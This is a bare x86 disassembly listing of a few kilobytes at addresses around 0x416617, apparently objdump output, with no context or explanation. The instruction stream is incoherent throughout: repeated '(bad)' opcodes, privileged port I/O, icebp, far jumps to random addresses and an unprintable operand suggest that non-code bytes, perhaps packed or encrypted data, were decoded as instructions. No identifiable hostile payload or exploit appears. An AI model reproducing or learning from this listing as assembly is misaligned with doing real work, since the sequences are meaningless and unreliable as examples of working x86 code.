  416617:	lock pop edx
  416619:	rcr    BYTE PTR ds:0x9f8e7b1b,1
  41661f:	bound  eax,QWORD PTR [ebp-0x75]
  416622:	and    al,0x26
  416624:	mov    dh,0x84
  416626:	jae    0x416693
  416628:	mov    eax,0xadd18e1
  41662d:	in     al,0xda
  41662f:	popa   
  416630:	sbb    al,0x62
  416632:	call   0x5a609bf
  416637:	xchg   edi,eax
  416638:	lds    esi,FWORD PTR [edi+0x5c007b35]
  41663e:	and    al,0xff
  416640:	mov    ds:0xf35ba0e2,eax
  416645:	icebp  
  416646:	gs pop ds
  416648:	nop
  416649:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41664a:	mov    esp,0xb93983d6
  41664f:	pusha  
  416650:	ins    DWORD PTR es:[edi],dx
  416651:	out    0xa8,eax
  416653:	(bad)  
  416654:	and    BYTE PTR [edi+0x4fd3c2b8],ah
  41665a:	in     eax,dx
  41665b:	nop
  41665c:	int3   
  41665d:	sbb    dl,dh
  41665f:	out    0x2e,eax
  416661:	dec    eax
  416662:	js     0x4166a0
  416664:	scas   al,BYTE PTR es:[edi]
  416665:	jg     0x4166bb
  416667:	(bad)  
  416668:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416669:	pop    ds
  41666a:	icebp  
  41666b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41666c:	repnz xor edi,edi
  41666f:	jno    0x4166d7
  416671:	daa    
  416672:	jb     0x41666a
  416674:	enter  0xa2df,0xc3
  416678:	dec    dl
  41667a:	xor    DWORD PTR [ebp+ecx*4+0x4aeb05d7],esi
  416681:	imul   esi,DWORD PTR ds:0x49a7cc3f,0xc74be4c9
  41668b:	dec    edx
  41668c:	int    0x4a
  41668e:	ror    BYTE PTR [eax+0xc],cl
  416691:	cmp    eax,0x697d614d
  416696:	push   ds
  416697:	ins    DWORD PTR es:[edi],dx
  416698:	(bad)  
  416699:	test   eax,0xe936c88f
  41669e:	push   ss
  41669f:	or     ah,ch
  4166a1:	lock push ds
  4166a3:	sahf   
  4166a4:	repnz mov BYTE PTR [edi],bl
  4166a7:	jnp    0x416666
  4166a9:	loope  0x41662d
  4166ab:	test   al,0x77
  4166ad:	sbb    ebx,DWORD PTR [esi-0x66]
  4166b0:	sub    DWORD PTR [ebx-0x9],esp
  4166b3:	push   0x2f
  4166b5:	jecxz  0x416654
  4166b7:	add    eax,esi
  4166b9:	dec    edi
  4166ba:	jbe    0x4166ea
  4166bc:	loope  0x4166dc
  4166be:	inc    edx
  4166bf:	aaa    
  4166c0:	add    DWORD PTR [ebx],ebp
  4166c2:	call   0xe882:0xf07c8c66
  4166c9:	loope  0x416699
  4166cb:	sub    DWORD PTR [ecx],0xec6e0731
  4166d1:	mov    edx,0x2af1d485
  4166d6:	jne    0x416723
  4166d8:	adc    bl,dh
  4166da:	das    
  4166db:	(bad)  
  4166dd:	jecxz  0x416749
  4166df:	je     0x4166c3
  4166e1:	xor    ebx,DWORD PTR [ebp-0x73414a20]
  4166e7:	fcompp 
  4166e9:	sub    BYTE PTR [eax],al
  4166eb:	mov    ch,0x5b
  4166ed:	rcl    DWORD PTR [eax+0x6fd6d97],0x8c
  4166f4:	jae    0x41675f
  4166f6:	push   ds
  4166f7:	jbe    0x416748
  4166f9:	arpl   WORD PTR [ecx-0x7],cx
  4166fc:	sahf   
  4166fd:	scas   al,BYTE PTR es:[edi]
  4166fe:	and    DWORD PTR [eax+eax*4-0x59],eax
  416702:	imul   esp,DWORD PTR [edx],0xffffffbf
  416705:	test   al,0x69
  416707:	icebp  
  416708:	or     al,BYTE PTR [edi+0x4c]
  41670b:	popa   
  41670c:	push   edx
  41670d:	jnp    0x416704
  41670f:	or     BYTE PTR [eax+eax*4+0x261995c6],dh
  416716:	out    dx,al
  416717:	and    BYTE PTR [edi],dl
  416719:	lds    edx,FWORD PTR [esi]
  41671b:	retf   
  41671c:	jmp    0xca6ebb7
  416721:	xchg   eax,edx
  416723:	cmp    DWORD PTR [edx+ebp*4-0x11],0xffffffcb
  416728:	stos   BYTE PTR es:[edi],al
  416729:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41672a:	ficomp DWORD PTR [eax-0xa]
  41672d:	mov    al,0x7
  41672f:	jge    0x416731
  416731:	dec    ecx
  416732:	jae    0x416742
  416734:	ins    DWORD PTR es:[edi],dx
  416735:	cmp    ebx,DWORD PTR [ecx+0x6c]
  416738:	mov    ah,0xdc
  41673a:	mov    al,ds:0x5996a27
  41673f:	push   ds
  416740:	adc    al,BYTE PTR [eax-0x4e]
  416743:	pop    es
  416744:	mov    ah,BYTE PTR [esp+edx*8-0x7c]
  416748:	sub    bl,dl
  41674a:	or     eax,DWORD PTR [ebx+0x483c4b0]
  416750:	retf   
  416751:	mov    ah,0x14
  416753:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416754:	sbb    bl,BYTE PTR [ecx-0x60]
  416757:	arpl   ax,ax
  416759:	mov    al,0x3c
  41675b:	sub    BYTE PTR [edi+0xc],ah
  41675e:	mov    ecx,0xa44dd5f5
  416763:	xor    dl,0x7e
  416766:	push   0x2be332f7
  41676b:	jle    0x4166f9
  41676d:	inc    ecx
  41676e:	pcmpeqb mm3,QWORD PTR [ebx-0x61]
  416772:	cmp    ah,BYTE PTR [ebx+0x76]
  416775:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416776:	xchg   edi,eax
  416777:	or     BYTE PTR ss:[ebx],bl
  41677a:	clc    
  41677b:	push   edx
  41677c:	in     eax,0xe1
  41677e:	jmp    FWORD PTR [ecx]
  416780:	push   eax
  416781:	push   es
  416782:	leave  
  416783:	jg     0x416780
  416785:	gs sbb dl,dl
  416788:	hlt    
  416789:	adc    al,BYTE PTR [eax]
  41678b:	in     eax,0xc4
  41678d:	and    eax,0xe01d1fba
  416792:	mov    bl,0xf5
  416794:	mov    ds:0x82465844,al
  416799:	mov    ebp,0x9e4223b7
  41679e:	sub    edi,edx
  4167a0:	push   edi
  4167a1:	cmc    
  4167a2:	sbb    al,0xb6
  4167a4:	sbb    ch,0x7e
  4167a7:	cli    
  4167a8:	xchg   edi,eax
  4167a9:	pop    edi
  4167aa:	push   0xffffffb5
  4167ac:	scas   eax,DWORD PTR es:[edi]
  4167ad:	jmp    0x7a39f6d7
  4167b2:	mov    ch,0x56
  4167b4:	imul   esi,DWORD PTR [edx],0x6b
  4167b7:	dec    eax
  4167b8:	xor    ah,BYTE PTR [ebx]
  4167ba:	cmp    bl,BYTE PTR [esi-0x47]
  4167bd:	mov    ebx,0x6153281b
  4167c2:	mov    dl,0x26
  4167c4:	loope  0x41675f
  4167c6:	pusha  
  4167c7:	jmp    0x4167b3
  4167c9:	stc    
  4167ca:	outs   dx,BYTE PTR ds:[esi]
  4167cb:	push   esp
  4167cc:	add    ebp,DWORD PTR [esi]
  4167ce:	hlt    
  4167cf:	test   DWORD PTR [edx],0xf43c7558
  4167d5:	or     BYTE PTR [esi],al
  4167d7:	sar    DWORD PTR [edx-0x1fd24996],1
  4167dd:	and    al,0xbf
  4167df:	add    al,0xaf
  4167e1:	fstp   DWORD PTR [ecx-0x45]
  4167e4:	jmp    0x416851
  4167e6:	mov    ebp,0xc4d9efa6
  4167eb:	mov    esp,0x761a11f9
  4167f0:	pop    ds
  4167f1:	ja     0x416867
  4167f3:	push   esp
  4167f4:	jp     0x41677e
  4167f6:	jns    0x4167a3
  4167f8:	out    0x54,al
  4167fa:	ins    BYTE PTR es:[edi],dx
  4167fb:	push   es
  4167fc:	(bad)  
  4167fd:	out    dx,al
  4167fe:	icebp  
  4167ff:	pop    es
  416800:	ins    BYTE PTR es:[edi],dx
  416801:	leave  
  416802:	inc    edx
  416803:	cld    
  416804:	pop    ds
  416805:	xor    eax,0x5621654b
  41680a:	mov    edi,0xdbc603d
  41680f:	and    al,0xfb
  416811:	mov    ah,0xf5
  416813:	xor    BYTE PTR [eax+0x4d71a3f4],al
  416819:	lock fisub WORD PTR [ecx+0x35]
  41681d:	cmp    al,0x9c
  41681f:	call   0xf93e:0x1573b09d
  416826:	sbb    BYTE PTR [edi-0x5829d474],0xbd
  41682d:	inc    esp
  41682e:	inc    eax
  41682f:	rol    DWORD PTR [edx-0x35],1
  416832:	xor    bl,BYTE PTR [ecx-0x495033da]
  416838:	dec    ebp
  416839:	xchg   esp,eax
  41683a:	dec    ecx
  41683b:	jle    0x4167d8
  41683d:	fnstenv [ecx]
  41683f:	inc    edx
  416840:	xchg   esp,edx
  416842:	shl    ebp,0xb1
  416845:	sub    ax,0x61
  416849:	or     esp,DWORD PTR [edx-0xb]
  41684c:	push   eax
  41684d:	xchg   ebp,eax
  41684e:	mov    bl,0x21
  416850:	sbb    cl,BYTE PTR [esi]
  416852:	aaa    
  416853:	lods   eax,DWORD PTR ds:[esi]
  416854:	ja     0x4167e2
  416856:	retf   
  416857:	inc    ebx
  416858:	and    DWORD PTR [esi+eax*4-0x49],ebp
  41685c:	mov    ebp,0xc168ca55
  416861:	dec    ebp
  416862:	retf   0x85fc
  416865:	int3   
  416866:	push   esp
  416867:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416868:	inc    eax
  416869:	aad    0x44
  41686b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41686c:	mov    ah,0x3f
  41686e:	pop    esi
  41686f:	sub    ebp,DWORD PTR [edi-0x42]
  416872:	pop    esp
  416873:	(bad)  
  416874:	jae    0x416822
  416876:	dec    eax
  416877:	push   esi
  416878:	(bad)  
  41687a:	xchg   ecx,eax
  41687b:	adc    al,0xc9
  41687d:	add    eax,DWORD PTR [edx-0x59]
  416880:	mov    esp,0xc914f83
  416885:	and    BYTE PTR [esi],0xb9
  416888:	xchg   ebp,eax
  416889:	add    al,0xe0
  41688b:	stos   DWORD PTR es:[edi],eax
  41688c:	loop   0x416851
  41688e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41688f:	adc    dl,bl
  416891:	inc    edx
  416892:	scas   al,BYTE PTR es:[edi]
  416893:	in     al,dx
  416894:	sbb    ebp,esp
  416896:	(bad)  
  416897:	shl    DWORD PTR [edx-0x3c],1
  41689a:	sbb    ebx,esi
  41689c:	out    0xba,al
  41689e:	icebp  
  41689f:	inc    edx
  4168a0:	aaa    
  4168a1:	rcl    BYTE PTR [edi],0x7b
  4168a4:	cdq    
  4168a5:	add    dh,bl
  4168a7:	into   
  4168a8:	addr16 dec ecx
  4168aa:	mov    al,ds:0x82df7933
  4168af:	cwde   
  4168b0:	lock add al,0x20
  4168b3:	sbb    eax,0xa48c3df2
  4168b8:	iret   
  4168b9:	(bad)  
  4168ba:	sbb    ebx,DWORD PTR ds:0x2a02a25a
  4168c0:	rol    BYTE PTR gs:[edx-0x9],1
  4168c4:	cld    
  4168c5:	cmp    esi,edx
  4168c7:	xlat   BYTE PTR ds:[ebx]
  4168c8:	xor    DWORD PTR [eax-0xd],ebx
  4168cb:	sub    DWORD PTR [edx+0x36],eax
  4168ce:	xor    al,cl
  4168d0:	xchg   esi,esp
  4168d2:	in     eax,dx
  4168d3:	xchg   edx,eax
  4168d4:	push   ds
  4168d5:	es xchg esi,eax
  4168d7:	sahf   
  4168d8:	xor    esp,DWORD PTR [edi+0x4d]
  4168db:	retf   0xae89
  4168de:	sbb    eax,0xa197183c
  4168e3:	dec    esi
  4168e4:	cmp    edi,ebx
  4168e6:	sbb    eax,0x9bdbaef
  4168eb:	and    BYTE PTR [ecx-0x26],dl
  4168ee:	or     dl,BYTE PTR [edx]
  4168f0:	das    
  4168f1:	pusha  
  4168f2:	mov    esp,0x3f787e2f
  4168f7:	mov    ah,0xd7
  4168f9:	inc    edx
  4168fa:	fucomip st,st(3)
  4168fc:	jmp    0x4ee7:0x575f32d0
  416903:	and    cl,BYTE PTR [esi-0x26]
  416906:	lods   eax,DWORD PTR ds:[esi]
  416907:	jecxz  0x41691f
  416909:	test   al,0x72
  41690b:	out    0xbf,al
  41690d:	pop    ebp
  41690e:	lods   al,BYTE PTR ds:[esi]
  41690f:	or     DWORD PTR [edi+ebx*4+0x22],eax
  416913:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416914:	shl    BYTE PTR [ebx],cl
  416916:	das    
  416917:	lahf   
  416918:	rol    DWORD PTR [ecx+0x2af271a2],0xc6
  41691f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416920:	inc    edi
  416921:	fisttp DWORD PTR [eax]
  416923:	mov    ecx,0x4f4814a7
  416928:	sbb    edi,ebp
  41692a:	dec    esi
  41692b:	nop
  41692c:	stos   BYTE PTR es:[edi],al
  41692d:	mov    eax,ds:0x88094c55
  416932:	add    edx,DWORD PTR [ebp+0x65a885e]
  416938:	das    
  416939:	inc    eax
  41693a:	add    BYTE PTR [edi-0x8],bl
  41693d:	nop
  41693e:	iret   
  41693f:	add    al,0xbc
  416941:	jp     0x416919
  416943:	sbb    BYTE PTR [ebp-0x6a8954ba],al
  416949:	outs   dx,BYTE PTR ds:[esi]
  41694a:	mov    bh,0x0
  41694c:	rcl    ecx,cl
  41694e:	dec    eax
  41694f:	out    0x8a,eax
  416951:	xchg   edx,eax
  416952:	addr16 cs jbe 0x4168e6
  416956:	cld    
  416957:	pop    edi
  416958:	sbb    ah,BYTE PTR [ebp-0x1ba24423]
  41695e:	jl     0x4169ba
  416960:	int3   
  416961:	jmp    0xe431:0x5c6d4c5e
  416968:	leave  
  416969:	push   es
  41696a:	xchg   ecx,eax
  41696b:	or     DWORD PTR [esp+ebx*1-0x4b],eax
  41696f:	and    ah,BYTE PTR ds:0x871bfff
  416975:	inc    dh
  416977:	jne    0x416972
  416979:	mov    ah,BYTE PTR [esi]
  41697b:	sub    DWORD PTR [eax+ebp*1+0x5d],esp
  41697f:	ins    DWORD PTR es:[edi],dx
  416980:	dec    ebp
  416981:	push   edi
  416982:	test   BYTE PTR [ebx-0x1297454e],0xac
  416989:	fs clc 
  41698b:	imul   edi,DWORD PTR [edi],0xfffffff8
  41698e:	popf   
  41698f:	jmp    0x2d4b06e0
  416994:	arpl   WORD PTR [ecx-0x1d33c06],ax
  41699a:	out    0xbc,eax
  41699c:	pushf  
  41699d:	push   ss
  41699e:	jnp    0x4169e1
  4169a0:	sbb    edi,eax
  4169a2:	mov    ebp,DWORD PTR [ebx+0x7c2cf248]
  4169a8:	and    DWORD PTR [eax-0x58],esp
  4169ab:	xor    ch,ah
  4169ad:	out    0x15,eax
  4169af:	ret    
  4169b0:	jmp    0x7fc2:0x6bdc4d75
  4169b7:	ror    DWORD PTR [ebx+0x54947270],0x1e
  4169be:	scas   eax,DWORD PTR es:[edi]
  4169bf:	jne    0x4169ba
  4169c1:	and    ebx,eax
  4169c3:	lods   al,BYTE PTR ds:[esi]
  4169c4:	xchg   dl,ah
  4169c6:	xchg   edx,eax
  4169c7:	shr    BYTE PTR [edi+0x2cb7eec8],0xf6
  4169ce:	and    edx,ecx
  4169d0:	mov    DWORD PTR [ecx-0x2a],ebx
  4169d3:	lahf   
  4169d4:	imul   eax,DWORD PTR [ecx-0x2cf6c796],0x6c81ca35
  4169de:	inc    esi
  4169df:	cwde   
  4169e0:	xlat   BYTE PTR ds:[ebx]
  4169e1:	lahf   
  4169e2:	fwait
  4169e3:	addr16 daa 
  4169e5:	and    ecx,esp
  4169e7:	lods   eax,DWORD PTR ds:[esi]
  4169e8:	adc    cl,dh
  4169ea:	xlat   BYTE PTR ds:[ebx]
  4169eb:	sbb    al,0xd
  4169ed:	mov    esi,0xb65ce443
  4169f2:	test   DWORD PTR ds:0xf660713,ecx
  4169f8:	xor    ah,dl
  4169fa:	ja     0x4169c2
  4169fc:	inc    ecx
  4169fd:	(bad)  
  4169fe:	ins    DWORD PTR es:[edi],dx
  4169ff:	mov    dh,0xf1
  416a01:	push   ecx
  416a02:	or     cl,BYTE PTR [ebx]
  416a04:	mov    dh,0x5c
  416a06:	fprem1 
  416a08:	push   0x71
  416a0a:	or     al,0xba
  416a0c:	and    DWORD PTR [esp+eiz*4+0x3312a2f6],ebp
  416a13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a14:	xchg   ebx,eax
  416a15:	mov    ebx,0xc7410ccb
  416a1a:	and    BYTE PTR [ebx+esi*4+0x5c],ch
  416a1e:	dec    eax
  416a1f:	adc    BYTE PTR [ecx-0xd],ch
  416a22:	mov    ebp,0x8f21ec7b
  416a27:	mov    ds:0x56d881e2,al
  416a2c:	stos   DWORD PTR es:[edi],eax
  416a2d:	xor    cl,ch
  416a2f:	cmp    al,0x55
  416a31:	mov    bh,BYTE PTR [ecx]
  416a33:	pop    esp
  416a34:	ins    DWORD PTR es:[edi],dx
  416a35:	or     DWORD PTR [ebp+0x2f1b342c],edi
  416a3b:	mov    bl,cl
  416a3d:	inc    ebp
  416a3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a3f:	and    DWORD PTR fs:[edx+0x4b],ecx
  416a43:	lahf   
  416a44:	cs ja  0x416a03
  416a47:	ror    BYTE PTR [edi-0x14],1
  416a4a:	and    BYTE PTR [ebp+0x26837f25],bl
  416a50:	cmp    bh,bl
  416a52:	lea    edx,[ebp-0x61]
  416a55:	inc    edx
  416a56:	(bad)  
  416a58:	dec    edx
  416a59:	pushf  
  416a5a:	ja     0x416ace
  416a5c:	lfence 
  416a5f:	mov    edx,0x511a11f8
  416a64:	xchg   ebp,eax
  416a65:	inc    edi
  416a66:	aas    
  416a67:	dec    ebp
  416a68:	pushf  
  416a69:	test   ecx,ebx
  416a6b:	(bad)  
  416a6d:	and    eax,0x168a44b8
  416a72:	dec    esi
  416a73:	test   BYTE PTR [ebx],cl
  416a75:	dec    edx
  416a76:	mov    ds,WORD PTR [ecx]
  416a78:	int3   
  416a79:	pop    eax
  416a7a:	inc    edx
  416a7b:	mov    edx,0x6ff0262d
  416a80:	and    edi,DWORD PTR [esi-0xd]
  416a83:	or     al,0x36
  416a85:	pop    edx
  416a86:	add    eax,0xe0387914
  416a8b:	test   al,0x74
  416a8d:	aam    0x71
  416a8f:	fcomp  QWORD PTR [ebp+0x5e13e061]
  416a95:	mov    bl,BYTE PTR [eax+0x10]
  416a98:	push   cs
  416a99:	mov    BYTE PTR [eax],0x26
  416a9c:	fsubr  st,st(0)
  416a9e:	pop    ss
  416a9f:	popa   
  416aa0:	cmp    ebx,DWORD PTR [esi+0x7]
  416aa3:	pop    esp
  416aa4:	(bad)  
  416aa5:	(bad)  
  416aa6:	(bad)  
  416aa7:	jl     0x416ac1
  416aa9:	push   edi
  416aaa:	push   eax
  416aab:	jb     0x416acb
  416aad:	mov    esp,0xa7d61088
  416ab2:	mov    ebx,0xea4a7c04
  416ab7:	bswap  ebp
  416ab9:	rcr    BYTE PTR [esi+0x3167f3c5],cl
  416abf:	jbe    0x416a8a
  416ac1:	dec    edx
  416ac2:	dec    eax
  416ac3:	dec    ecx
  416ac4:	clc    
  416ac5:	push   ebp
  416ac6:	fist   DWORD PTR [edx+0x64f73297]
  416acc:	pop    edx
  416acd:	adc    DWORD PTR [ebp+edx*1-0x5d],ecx
  416ad1:	and    eax,0xcf5edd00
  416ad6:	xchg   ebp,eax
  416ad7:	and    al,0xa8
  416ad9:	and    DWORD PTR [esi-0x2a],edi
  416adc:	mov    ds:0x3d22c5a5,eax
  416ae1:	or     al,0x77
  416ae3:	xchg   ebx,eax
  416ae4:	(bad)  
  416ae6:	dec    esp
  416ae7:	ror    bl,0x8a
  416aea:	mov    eax,ds:0x6de527b9
  416aef:	dec    esi
  416af0:	lods   eax,DWORD PTR ds:[esi]
  416af1:	push   ebx
  416af2:	or     ebx,ecx
  416af4:	inc    esi
  416af5:	fdivr  DWORD PTR [eax]
  416af7:	int3   
  416af8:	fcmovu st,st(5)
  416afa:	mov    ds:0xfbaf58e1,eax
  416aff:	fisub  DWORD PTR [ebp-0x6ff43a66]
  416b05:	mov    esi,0x76a51359
  416b0a:	push   ecx
  416b0b:	scas   al,BYTE PTR es:[edi]
  416b0c:	pop    esp
  416b0d:	jb     0x416b27
  416b0f:	shl    DWORD PTR [ebx+0x6d0e5139],1
  416b15:	sar    BYTE PTR [esi-0x688e21a8],0x41
  416b1c:	and    DWORD PTR [ebp+0x0],esi
  416b1f:	shr    bh,1
  416b21:	jmp    0x19a650ac
  416b26:	fwait
  416b27:	lock popf 
  416b29:	sahf   
  416b2a:	outs   dx,BYTE PTR ds:[esi]
  416b2b:	imul   esi,ebx,0xffffffaa
  416b2e:	fisub  DWORD PTR [edi+0x541dddde]
  416b34:	cmc    
  416b35:	ret    
  416b36:	int    0x9a
  416b38:	dec    ebp
  416b39:	mov    bh,0x7a
  416b3b:	int3   
  416b3c:	(bad)  [edx+0x1d]
  416b3f:	push   0x18978c2f
  416b44:	int3   
  416b45:	push   edx
  416b46:	lea    esp,[ebp+0x14484752]
  416b4c:	mov    WORD PTR [ebx-0x58],gs
  416b4f:	repz push edi
  416b51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b52:	fistp  QWORD PTR [ebx+0xd]
  416b55:	idiv   esi
  416b57:	dec    edx
  416b58:	sbb    dl,BYTE PTR [edx-0x27c71fb1]
  416b5e:	add    dl,BYTE PTR [eax+ecx*8+0x77d80e7c]
  416b65:	push   edx
  416b66:	mov    ah,ch
  416b68:	bound  edx,QWORD PTR [ecx+0x3b]
  416b6b:	js     0x416b72
  416b6d:	sar    BYTE PTR [eax],1
  416b6f:	sti    
  416b70:	dec    esp
  416b71:	out    0x69,al
  416b73:	pop    eax
  416b74:	adc    dh,ch
  416b76:	stos   DWORD PTR es:[edi],eax
  416b77:	popa   
  416b78:	imul   ecx,DWORD PTR [edi+0x701c1f01],0xffffffd4
  416b7f:	push   ebx
  416b80:	aas    
  416b81:	jge    0x416b25
  416b83:	mov    ch,0x48
  416b85:	add    eax,0x4f27a2a4
  416b8a:	shl    DWORD PTR [edi+0x7e6fe72d],cl
  416b90:	in     eax,dx
  416b91:	int    0xf9
  416b93:	jb     0x416b22
  416b95:	fdiv   DWORD PTR [ecx]
  416b97:	(bad)  
  416b98:	in     eax,dx
  416b99:	mov    ebx,0x59c9ffaf
  416b9e:	dec    esi
  416b9f:	pop    edi
  416ba0:	int3   
  416ba1:	mov    ebx,0x6f195f17
  416ba6:	les    ebx,FWORD PTR [ebp-0x4c5d12bd]
  416bac:	iret   
  416bad:	mov    ds:0x73124a06,al
  416bb2:	adc    eax,0x783f09ce
  416bb7:	test   BYTE PTR [eax-0x30154ae],0xaa
  416bbe:	enter  0x88a7,0x9c
  416bc2:	ficom  DWORD PTR ds:0xfecc1267
  416bc8:	loop   0x416c29
  416bca:	(bad)  
  416bcb:	(bad)  
  416bcc:	mov    ecx,0x61cec2ad
  416bd1:	pop    edx
  416bd2:	and    DWORD PTR ds:0x390ecc93,ecx
  416bd8:	xor    eax,0x15065033
  416bdd:	ss leave 
  416bdf:	push   edi
  416be0:	shr    DWORD PTR [ebp+0x1fffcdcd],cl
  416be6:	and    al,0xa
  416be8:	push   0x7702ba9b
  416bed:	xchg   esp,eax
  416bee:	xchg   esi,eax
  416bef:	aaa    
  416bf0:	mov    edx,0x60778369
  416bf5:	mov    ecx,ebp
  416bf7:	dec    eax
  416bf8:	lds    esp,FWORD PTR [ebx+0x7c40713a]
  416bfe:	dec    ebx
  416bff:	jns    0x416c4b
  416c01:	cmp    BYTE PTR [ebp+0x497acd69],ah
  416c07:	mov    al,ds:0x840faaf
  416c0c:	jmp    0xa5c1:0x6a5a7a1f
  416c13:	shl    DWORD PTR [edx],1
  416c15:	fwait
  416c16:	sahf   
  416c17:	mov    al,ds:0x27e59211
  416c1c:	sbb    edx,DWORD PTR [edx+0x4850aa1e]
  416c22:	rcl    BYTE PTR [ebx-0x44d3f762],0xc5
  416c29:	fwait
  416c2a:	xor    DWORD PTR [eax+0x108227d],edi
  416c30:	push   es
  416c31:	shl    BYTE PTR [ecx],0xb9
  416c34:	dec    ebx
  416c35:	mov    ah,0xfe
  416c37:	mov    esi,0xcb0219bb
  416c3c:	xchg   ebx,eax
  416c3d:	cmp    dh,al
  416c3f:	fisttp QWORD PTR [edi-0x5fd8ef67]
  416c45:	sub    al,BYTE PTR [ebx-0x11]
  416c48:	rcr    ecx,0x9c
  416c4b:	pusha  
  416c4c:	xor    BYTE PTR [ecx],ah
  416c4e:	nop
  416c4f:	xchg   esp,eax
  416c50:	xchg   esi,eax
  416c51:	shl    BYTE PTR [esi],0xaf
  416c54:	push   0x51
  416c56:	popa   
  416c57:	fst    DWORD PTR [ecx]
  416c59:	mov    bl,0x99
  416c5b:	in     al,0xbc
  416c5d:	jne    0x416c63
  416c5f:	adc    ch,dl
  416c61:	pusha  
  416c62:	jae    0x416c56
  416c64:	ja     0x416cc3
  416c66:	pop    edi
  416c67:	mov    ecx,0xa8690ca6
  416c6c:	(bad)  [ecx+eiz*4-0x4]
  416c70:	adc    eax,0x4e93f379
  416c75:	rcl    DWORD PTR [ebp+0x75],cl
  416c78:	out    dx,al
  416c79:	dec    esi
  416c7a:	xchg   esp,eax
  416c7b:	imul   edx,DWORD PTR [edx],0x8289acdc
  416c81:	loopne 0x416c83
  416c83:	and    eax,0x48f1428
  416c88:	sbb    eax,0x6bb44841
  416c8d:	jmp    0xf99452aa
  416c92:	cli    
  416c93:	mov    al,ds:0x361f6d0
  416c98:	jne    0x416d14
  416c9a:	push   ecx
  416c9b:	sub    BYTE PTR [eax+esi*8+0x0],0x32
  416ca0:	cli    
  416ca1:	pop    es
  416ca2:	jmp    0xd39f5493
  416ca7:	mov    DWORD PTR [edi],edx
  416ca9:	sar    BYTE PTR [edx],0x1c
  416cac:	cmp    DWORD PTR [ecx],0x26
  416caf:	loope  0x416c63
  416cb1:	pop    edi
  416cb2:	xchg   edi,eax
  416cb3:	ja     0x416d2d
  416cb5:	dec    esi
  416cb6:	ins    BYTE PTR es:[edi],dx
  416cb7:	add    DWORD PTR [edx-0x64d4a8a2],ebp
  416cbd:	dec    eax
  416cbe:	jmp    0xec5:0x5c8a4799
  416cc5:	pushf  
  416cc6:	push   0x7449211f
  416ccb:	jp     0x416c4d
  416ccd:	jo     0x416c50
  416ccf:	clc    
  416cd0:	sbb    bh,al
  416cd2:	jmp    0x83b:0x18a55ed3
  416cd9:	ss stos DWORD PTR es:[edi],eax
  416cdb:	lea    eax,[edx]
  416cdd:	addr16 jne 0x416c94
  416ce0:	mov    ah,0xb1
  416ce2:	test   BYTE PTR [edx-0x6c],cl
  416ce5:	mov    bl,0xd4
  416ce7:	into   
  416ce8:	neg    ecx
  416cea:	push   edi
  416ceb:	jbe    0x416ce5
  416ced:	pop    esi
  416cee:	cdq    
  416cef:	mov    WORD PTR [eax+0x7625ccce],es
  416cf5:	repnz mov eax,0x99b3bae3
  416cfb:	add    al,0xc4
  416cfd:	cmp    DWORD PTR [edx-0x3e],0x5c
  416d01:	or     eax,0xb4f05c3b
  416d06:	add    esi,edx
  416d08:	fld    DWORD PTR [ecx+eax*2+0x36]
  416d0c:	jno    0x416ca6
  416d0e:	pop    edx
  416d0f:	xchg   ebx,eax
  416d10:	add    eax,0x28e6f15e
  416d15:	jnp    0x416d42
  416d17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d18:	test   DWORD PTR [edi+0x75967e72],esi
  416d1e:	pop    esi
  416d1f:	cmp    al,0xd0
  416d21:	pop    esp
  416d22:	jmp    0x1e325354
  416d27:	stos   DWORD PTR es:[edi],eax
  416d28:	mov    ?,WORD PTR [esp+eax*1-0x13]
  416d2c:	stos   BYTE PTR es:[edi],al
  416d2d:	cli    
  416d2e:	or     eax,ebp
  416d30:	shl    DWORD PTR [esi+0x59],cl
  416d33:	out    0xdc,eax
  416d35:	pop    ebp
  416d36:	pop    esi
  416d37:	push   ebx
  416d38:	ins    BYTE PTR es:[edi],dx
  416d39:	adc    eax,0x9537b49f
  416d3e:	retf   0xb27
  416d41:	cmp    BYTE PTR [ebx+0x2d893b3],dh
  416d47:	frstor [edi-0x40]
  416d4a:	cmp    DWORD PTR [ecx],eax
  416d4c:	jmp    0x91d8:0x3ac05dbe
  416d53:	adc    al,0xbf
  416d55:	daa    
  416d56:	test   BYTE PTR [ecx],dl
  416d58:	lea    ebx,[eax-0x1d]
  416d5b:	xchg   edx,eax
  416d5c:	(bad)  
  416d5d:	and    esi,DWORD PTR [edx]
  416d5f:	ret    0x888c
  416d62:	out    dx,al
  416d63:	jmp    0x20512578
  416d68:	jo     0x416d5a
  416d6a:	sbb    BYTE PTR [edi+eax*4-0x2a62bd42],bl
  416d71:	dec    ebx
  416d72:	retf   0x3049
  416d75:	imul   edi,DWORD PTR [edx+ebx*8],0xad9350b0
  416d7c:	jno    0x416dc7
  416d7e:	dec    ebp
  416d7f:	push   esi
  416d80:	xor    al,0xdb
  416d82:	mov    bh,0xcb
  416d84:	retf   
  416d85:	pop    edx
  416d86:	fwait
  416d87:	(bad)  
  416d88:	aam    0x68
  416d8a:	outs   dx,DWORD PTR ds:[esi]
  416d8b:	ja     0x416d15
  416d8d:	fldenv [edi+0xc]
  416d90:	and    eax,0x5326e08
  416d95:	inc    esp
  416d96:	xor    BYTE PTR [ebx-0x20],ah
  416d99:	bswap  ebx
  416d9b:	inc    ebx
  416d9c:	pop    esp
  416d9d:	sbb    DWORD PTR [ebp-0x4b8735d7],ecx
  416da3:	inc    edx
  416da4:	mov    edi,0x27dfe09b
  416da9:	lss    ebp,FWORD PTR [edx+0x4eef625b]
  416db0:	push   esi
  416db1:	repz sbb eax,0xd295625
  416db7:	xchg   ebp,eax
  416db8:	adc    cl,BYTE PTR [ecx]
  416dba:	xchg   ebp,eax
  416dbb:	mov    dh,0x44
